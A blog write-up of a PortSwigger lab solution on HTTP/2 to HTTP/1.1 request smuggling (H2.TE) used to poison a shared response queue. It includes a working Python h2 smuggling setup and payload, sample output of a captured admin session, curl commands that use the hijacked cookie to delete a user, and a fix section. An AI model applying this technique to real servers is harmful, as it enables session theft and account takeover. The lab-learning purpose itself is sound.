---
layout: post
title: "PortSwigger: Response Queue Poisoning via H2.TE Request Smuggling"
date: 2027-09-02 09:00:00 -0500
categories: [Web Security, Request Smuggling]
tags: [portswigger, request-smuggling, http2, h2te, response-queue-poisoning, desync, web]
---

## Lab Summary

**Lab:** Response queue poisoning via H2.TE request smuggling  
**Difficulty:** Expert  
**CWE:** CWE-444 – Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')  
**Result:** Solved

---

## The Vulnerability

The site's front-end proxy talks to *you* in **HTTP/2** but talks to its own back-end in **HTTP/1.1**. That translation step is the bug.

In HTTP/1.1 a request body's length is declared with a header — `Content-Length` or `Transfer-Encoding: chunked`. HTTP/2 has no such header; body length is built into the binary frames. So if you add a `Transfer-Encoding: chunked` header to your HTTP/2 request, the front-end ignores it (it doesn't need it) — **but copies it through** when it rewrites your request into HTTP/1.1 for the back-end.

Now the back-end reads a chunked request. Chunked encoding ends with `0` followed by a blank line; anything after that terminator is parsed as **a brand-new request**. You've smuggled a second request inside the first.

## Why It Works — The Response Queue

Smuggle a *complete* extra request and the back-end produces **two responses** for what the front-end believes was **one** request. The front-end gives you the first and buffers the second on the connection it **shares with every other client**.

From then on that shared connection is **off by one**: each client receives the response meant for the *previous* request. When the **admin bot logs in**, the admin is handed someone else's leftover response, and the admin's real login response — a `302` carrying `Set-Cookie: session=…` — is handed to **the next request on the connection**. Keep poking it and that next request is yours. You receive the admin's session cookie.

## Exploitation

curl and Burp won't send the forbidden `Transfer-Encoding` header over HTTP/2. A raw HTTP/2 client (Python's `h2` with header validation disabled) will:

```python
cfg = h2.config.H2Configuration(
    client_side=True,
    validate_outbound_headers=False,
    normalize_outbound_headers=False,
)
# HTTP/2 request:   :method POST   :path /   transfer-encoding: chunked
# DATA frame body:
#   0\r\n\r\nGET /x HTTP/1.1\r\nHost: <lab>\r\n\r\n
```

**1. Confirm the desync.** Smuggle the request above, then send a plain `GET /` on the same connection. The home page should be `200` (~12 KB); instead it returns `404` (11 bytes) — the leaked response to the smuggled `GET /x`. Off by one = confirmed.

```
smuggle 200 12174 | plainGET 404 11   (plainGET should be the home page — it isn't)
```

**2. Poison and wait.** Resend the smuggle continuously (~10/second). After ~60 seconds one response comes back as **`302` with `Set-Cookie: session=…`** — the admin's login. Every response carries a *fresh anonymous* `session=` cookie, so match on the **302 status**, not on the cookie's presence.

```
.. 600 200
[634] status=302 cookies=['session=<REDACTED-32-CHAR-ADMIN-SESSION>; Secure; HttpOnly; SameSite=None']
```

**3. Use the session.** The queue is still desynced, so retry until the real panel returns `200`:

```bash
curl -H 'Cookie: session=<admin>' https://<lab>/admin     # -> 200 admin panel
```

**4. Delete carlos.**

```bash
curl -H 'Cookie: session=<admin>' 'https://<lab>/admin/delete?username=carlos'   # -> 302
```

The lab flips to **Solved**.

### Gotcha

Poisoning *once* then draining with normal requests caught nothing in four minutes — the offset drifts and you miss the admin's login. **Tight continuous resending** keeps the shared connection poisoned at all times, so the admin's `302` leaks the instant it appears (captured on the ~634th request, ~63 seconds in).

## The Fix

The front-end must not forward `Transfer-Encoding` (or `Content-Length`) when downgrading HTTP/2 to HTTP/1.1 — it should re-derive the body length from the HTTP/2 frame and write a single, unambiguous length to the back-end. Better still, **speak HTTP/2 end-to-end** so there is no downgrade and no header to misinterpret.
